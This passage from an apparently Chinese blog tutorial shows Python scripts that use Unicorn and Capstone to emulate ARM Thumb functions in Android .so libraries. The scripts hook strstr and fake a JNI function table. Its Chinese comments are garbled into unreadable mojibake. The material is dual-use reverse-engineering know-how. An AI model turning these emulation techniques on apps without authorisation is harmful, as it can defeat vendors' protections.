class="string">&quot;hook_mem_unmapped type:%d addr:0x%x,size:%d,value:0x%x&quot;</span> % (<span class="built_in">type</span>, address, size, value))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>   <span class="comment">#è¿”å›true æ¨¡æ‹Ÿå™¨ç»§ç»­å¾€ä¸‹é¢æ‰§è¡Œä»£ç   Falseåˆ™ç›¸å</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#è°ƒç”¨add(int a,int b)å‡½æ•°  ==&gt;  ä¸¤ä¸ªå‚æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">testthumb1</span>():</span><br><span class="line">    CODE=<span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;libunicorncourse03.so&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> sofile:</span><br><span class="line">        CODE=sofile.read()</span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE[<span class="number">0x1264C</span>:],<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(<span class="number">0x1264C</span>+i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span>*<span class="number">1024</span>*<span class="number">10</span></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    sp=address+size-<span class="number">16</span></span><br><span class="line">    </span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_SP,sp)   <span class="comment">#SPå¯„å­˜å™¨èµ‹å€¼</span></span><br><span class="line">    mu.mem_write(address,CODE)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,<span class="number">0x1</span>)  <span class="comment">#å¯„å­˜å™¨èµ‹å€¼</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x2</span>)</span><br><span class="line"></span><br><span class="line">    mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">    mu.hook_add(UC_HOOK_MEM_WRITE_UNMAPPED,hook_mem_unmapped)</span><br><span class="line">    addrstart=address+<span class="number">0x0001264c</span>+<span class="number">1</span></span><br><span class="line">    addrend=address+<span class="number">0x1265e</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mu.emu_start(addrstart,addrend)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;æ¨¡æ‹Ÿæ‰§è¡Œåå¯„å­˜å™¨å†…å®¹-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="comment">#è°ƒç”¨add_six(int a,int b,int c,int d,int e,int f) ==&gt; å…­ä¸ªå‚æ•°éœ€è¦ç”¨åˆ°æ ˆ</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">testthumb2</span>():</span><br><span class="line">    CODE=<span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;libunicorncourse03.so&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> sofile:</span><br><span class="line">        CODE=sofile.read()</span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE[<span class="number">0x12660</span>:],<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(<span class="number">0x12660</span>+i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span>*<span class="number">1024</span>*<span class="number">10</span></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    sp=address+size-<span class="number">16</span>                     </span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_SP,sp)   <span class="comment">#spå¯„å­˜å™¨èµ‹å€¼</span></span><br><span class="line">    mu.mem_write(address,CODE)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#å¯„å­˜å™¨èµ‹å€¼</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,<span class="number">0x1</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x2</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R2, <span class="number">0x3</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R3, <span class="number">0x4</span>)</span><br><span class="line">    mu.mem_write(sp + <span class="number">4</span>, struct.pack(<span class="string">&quot;I&quot;</span>, <span class="number">0x6</span>))  <span class="comment">#ä¸¤ä¸ªå‚æ•°è¦å…¥æ ˆ</span></span><br><span class="line">    mu.mem_write(sp, struct.pack(<span class="string">&quot;I&quot;</span>, <span class="number">0x5</span>))</span><br><span class="line">    <span class="comment">#å› ä¸ºä»£ç å¼€å§‹å¤„æœ‰ä¸ª push &#123;lr&#125;ï¼Œä¿æŒå †æ ˆå¹³è¡¡</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_LR, <span class="number">0x445</span> + address)  </span><br><span class="line">    </span><br><span class="line">    mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">    mu.hook_add(UC_HOOK_MEM_WRITE_UNMAPPED,hook_mem_unmapped)</span><br><span class="line">    addrstart=address+<span class="number">0x12660</span>+<span class="number">1</span></span><br><span class="line">    addrend=address+<span class="number">0x126B0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mu.emu_start(addrstart,addrend)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;æ¨¡æ‹Ÿæ‰§è¡Œåå¯„å­˜å™¨å†…å®¹-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    testthumb1()</span><br><span class="line">    testthumb2()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰“å°å¯„å­˜å™¨å†…å®¹</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i)))</span><br><span class="line"><span class="comment">#typedef void (*uc_cb_hookcode_t)(uc_engine *uc, uint64_t address, uint32_t size, void *user_data);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#è¾“å‡ºæŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€çš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readstring</span>(<span class="params">mu,address</span>):</span><br><span class="line">    result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp=mu.mem_read(address,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> tmp[<span class="number">0</span>]!=<span class="number">0</span>:</span><br><span class="line">        result+=<span class="built_in">chr</span>(tmp[<span class="number">0</span>])</span><br><span class="line">        address=address+<span class="number">1</span></span><br><span class="line">        tmp = mu.mem_read(address, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu,address,size,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> address ==<span class="number">0x1000</span>+<span class="number">0x126C8</span>:   <span class="comment">#å½“è¿è¡Œåˆ°strstr()å‡½æ•°æ—¶</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;è¿è¡Œåˆ°strstr&quot;</span>)</span><br><span class="line">        <span class="comment">#å‚çœ‹strstrçš„å‚æ•°åœ°å€</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span> % (<span class="number">0</span>, mu.reg_read(<span class="number">66</span>)))  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span> % (<span class="number">1</span>, mu.reg_read(<span class="number">67</span>)))</span><br><span class="line">        <span class="comment">#æ‰“å°ä¸¤ä¸ªå‚æ•°å­—ç¬¦ä¸²</span></span><br><span class="line">        r0value=readstring(mu,mu.reg_read(arm_const.UC_ARM_REG_R0))</span><br><span class="line">        r1value = readstring(mu, mu.reg_read(arm_const.UC_ARM_REG_R1))</span><br><span class="line">        <span class="built_in">print</span>(r0value+<span class="string">&#x27;----------&#x27;</span>+r1value)</span><br><span class="line">        <span class="comment">#è‡ªå·±å®ç°strstr()æ“ä½œ</span></span><br><span class="line">        index = r0value.find(r1value)</span><br><span class="line">        <span class="keyword">if</span> index == -<span class="number">1</span>:</span><br><span class="line">            mu.reg_write(unicorn.arm_const.UC_ARM_REG_R0, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            mu.reg_write(unicorn.arm_const.UC_ARM_REG_R0, index)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;call strstr------------------&quot;</span>)</span><br><span class="line"></span><br><span class="line">    code=mu.mem_read(address,size)</span><br><span class="line">    cp = Cs(CS_ARCH_ARM, CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(code, <span class="number">0</span>, <span class="built_in">len</span>(code)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span> % (address, i.mnemonic, i.op_str))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#è°ƒç”¨æ‰§è¡Œstrstr(char *a,char *b)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call_strstr</span>():</span><br><span class="line">    CODE=<span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;libunicorncourse03.so&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> sofile:</span><br><span class="line">        CODE=sofile.read()</span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE[<span class="number">0x12698</span>:],<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(<span class="number">0x12698</span>+i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span>*<span class="number">1024</span>*<span class="number">10</span></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    mu.mem_write(address, CODE)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#åœ¨å¼€è¾Ÿä¸€ä¸ªç©ºé—´ å­˜æ”¾ä¸€ä¸ªå­—ç¬¦ä¸²</span></span><br><span class="line">    mu.mem_map(address+size+<span class="number">0x1000</span>,<span class="number">1024</span>)</span><br><span class="line">    mu.mem_write(address+size+<span class="number">0x1000</span>,<span class="string">b&quot;flag4&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    sp=address+size-<span class="number">1000</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_SP,sp)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,address+size+<span class="number">0x1000</span>)  <span class="comment">#å­˜æ”¾æŒ‡é‡æŒ‡å‘&#x27;flag4&#x27;</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x2</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R2, <span class="number">0x3</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R3, <span class="number">0x4</span>)</span><br><span class="line">    mu.mem_write(sp + <span class="number">4</span>, struct.pack(<span class="string">&quot;I&quot;</span>, <span class="number">0x6</span>))</span><br><span class="line">    mu.mem_write(sp, struct.pack(<span class="string">&quot;I&quot;</span>, <span class="number">0x5</span>))</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_LR, <span class="number">0x445</span> + address)</span><br><span class="line">    </span><br><span class="line">    mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">    addrstart=address+<span class="number">0x12698</span>+<span class="number">1</span></span><br><span class="line">    addrend=address+<span class="number">0x12714</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mu.emu_start(addrstart,addrend)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;æ¨¡æ‹Ÿæ‰§è¡Œåå¯„å­˜å™¨å†…å®¹-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)    </span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    call_strstr()</span><br></pre></td></tr></table></figure><h2 id="ç¬¬å››è¯¾æ—¶">ç¬¬å››è¯¾æ—¶</h2><h4 id="è°ƒç”¨jniæ¥å£å‡½æ•°">è°ƒç”¨jniæ¥å£å‡½æ•°</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> unicorn.arm_const</span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰“å°å¯„å­˜å™¨çº¸</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i)))</span><br><span class="line">      </span><br><span class="line"><span class="comment">#è¾“å‡ºæŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€çš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readstring</span>(<span class="params">mu,address</span>):</span><br><span class="line">    result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp=mu.mem_read(address,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> tmp[<span class="number">0</span>]!=<span class="number">0</span>:</span><br><span class="line">        result+=<span class="built_in">chr</span>(tmp[<span class="number">0</span>])</span><br><span class="line">        address=address+<span class="number">1</span></span><br><span class="line">        tmp = mu.mem_read(address, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu,address,size,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> address&gt;=<span class="number">0</span> <span class="keyword">and</span> address&lt;=<span class="number">300</span>*<span class="number">4</span>:</span><br><span class="line">        index=address/<span class="number">4</span></span><br><span class="line">        <span class="keyword">if</span> index==<span class="number">676</span>/<span class="number">4</span>:  <span class="comment">#çœ‹åœ¨jninativeinterfaceçš„ä½ç½®</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;call GetStringUTFChars-----------------&quot;</span>)</span><br><span class="line">            r0value=mu.reg_read(unicorn.arm_const.UC_ARM_REG_R0)</span><br><span class="line">            r1value=mu.reg_read(unicorn.arm_const.UC_ARM_REG_R1)</span><br><span class="line">            r2value=mu.reg_read(unicorn.arm_const.UC_ARM_REG_R2)</span><br><span class="line">            content=readstring(mu,r1value)</span><br><span class="line">            mu.reg_write(unicorn.arm_const.UC_ARM_REG_R0,r1value)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(r0value)+<span class="string">&#x27;-----&#x27;</span>+content+<span class="string">&#x27;-----&#x27;</span>+<span class="built_in">str</span>(r2value))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;call GetStringUTFChars over-----------------&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> index==<span class="number">668</span>/<span class="number">4</span>:  <span class="comment">#çœ‹åœ¨jninativeinterfaceçš„ä½ç½®</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;call NewStringUTF-----------------&quot;</span>)</span><br><span class="line">            r0value = mu.reg_read(unicorn.arm_const.UC_ARM_REG_R0)</span><br><span class="line">            r1value = mu.reg_read(unicorn.arm_const.UC_ARM_REG_R1)</span><br><span class="line">            content = readstring(mu, r1value)</span><br><span class="line">            mu.reg_write(unicorn.arm_const.UC_ARM_REG_R0, r1value)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(r0value) + <span class="string">&#x27;-----&#x27;</span> + content)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;call NewStringUTF over-----------------&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;call jni interface------------------&quot;</span>)</span><br><span class="line"></span><br><span class="line">    code=mu.mem_read(address,size)</span><br><span class="line">    cp = Cs(CS_ARCH_ARM, CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(code, <span class="number">0</span>, <span class="built_in">len</span>(code)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span> % (address, i.mnemonic, i.op_str))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call_jni</span>():</span><br><span class="line">    CODE=<span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;libunicorncourse04.so&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> sofile:</span><br><span class="line">        CODE=sofile.read()</span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE[<span class="number">0x424</span>:],<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(<span class="number">0x424</span>+i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line"></span><br><span class="line">    JNIFUNCTIONLISTBASE=<span class="number">0x0</span></span><br><span class="line">    JNIFUNCTIONLISTSIZE=<span class="number">0x1000</span></span><br><span class="line">    JNINATIVEINTERFACE=<span class="number">301</span></span><br><span class="line">    mu.mem_map(<span class="number">0x0</span>, <span class="number">0x1000</span>)</span><br><span class="line">    <span class="comment">#åˆå§‹åŒ–jniæ¥å£ä¸­æ¯ä¸ªå‡½æ•°</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">300</span>,<span class="number">1</span>):</span><br><span class="line">        <span class="comment">#push &#123;lr&#125;  pop &#123;pc&#125;</span></span><br><span class="line">        mu.mem_write(i*<span class="number">4</span>+JNIFUNCTIONLISTBASE,<span class="string">b&quot;\x00\xb5\x00\xbd&quot;</span>)</span><br><span class="line">    <span class="comment">#åˆå§‹åŒ–jninativeinterfaceç»“æ„ä½“</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>,<span class="number">600</span>,<span class="number">1</span>):</span><br><span class="line">        mu.mem_write(i*<span class="number">4</span>,struct.pack(<span class="string">&quot;I&quot;</span>,(i-<span class="number">300</span>)*<span class="number">4</span>+<span class="number">1</span>))</span><br><span class="line">    <span class="comment">#åˆå§‹åŒ–jnienv* env</span></span><br><span class="line">    jnienv_pointer=<span class="number">601</span>*<span class="number">4</span></span><br><span class="line">    mu.mem_write(jnienv_pointer,struct.pack(<span class="string">&quot;I&quot;</span>,<span class="number">300</span>*<span class="number">4</span>))  <span class="comment">#envæŒ‡é’ˆ</span></span><br><span class="line"></span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span>*<span class="number">1024</span>*<span class="number">10</span></span><br><span class="line"></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    mu.mem_write(address, CODE)</span><br><span class="line">    mu.mem_map(address+size+<span class="number">0x1000</span>,<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># bx lr æ¶ˆé™¤__android_log_printå¹²æ‰°</span></span><br><span class="line">    mu.mem_write(address+<span class="number">0x4f8</span>,<span class="string">b&#x27;\x1e\xff\x2f\xe1&#x27;</span>)   </span><br><span class="line">    <span class="comment">#æˆ–è€… mu.mem_write(address +0x448, b&#x27;\x00\xbf\x00\xbf&#x27;)</span></span><br><span class="line">    </span><br><span class="line">    mu.mem_write(address+size+<span class="number">0x1000</span>,<span class="string">b&#x27;imtestfromjni&#x27;</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,jnienv_pointer)  <span class="comment">#å­˜æ”¾æŒ‡é‡åœ°å€</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x0</span>)  <span class="comment">#æ²¡ç”¨åˆ° è®¾0å³å¯</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R2,address+size+<span class="number">0x1000</span>) <span class="comment">#jstring</span></span><br><span class="line">    sp = address + size - <span class="number">16</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_SP, sp)</span><br><span class="line"></span><br><span class="line">    mu.hook_add(UC_HOOK_CODE, hook_code,<span class="literal">None</span>,<span class="number">0</span>,<span class="number">300</span>*<span class="number">4</span>) <span class="comment">#å¯¹æŒ‡å®šèŒƒå›´ è¿›è¡Œhook</span></span><br><span class="line">    </span><br><span class="line">    addrstart = address + <span class="number">0x0424</span> + <span class="number">1</span></span><br><span class="line">    addrend = address + <span class="number">0x045c</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> datetime</span><br><span class="line">        starttime=datetime.datetime.now()</span><br><span class="line">        mu.emu_start(addrstart,addrend)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;emulat over&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;æ¨¡æ‹Ÿæ‰§è¡Œåå¯„å­˜å™¨å†…å®¹-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)</span><br><span class="line">        <span class="comment">#æ‰“å°æœ€åçš„è¿”å›å€¼å­—ç¬¦ä¸²</span></span><br><span class="line">        r0value=mu.reg_read(unicorn.arm_const.UC_ARM_REG_R0)</span><br><span class="line">        result=readstring(mu,r0value)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;result--&gt;&quot;</span>+result)</span><br><span class="line">        endtime=datetime.datetime.now()</span><br><span class="line">        <span class="built_in">print</span>(endtime-starttime)</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    call_jni()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 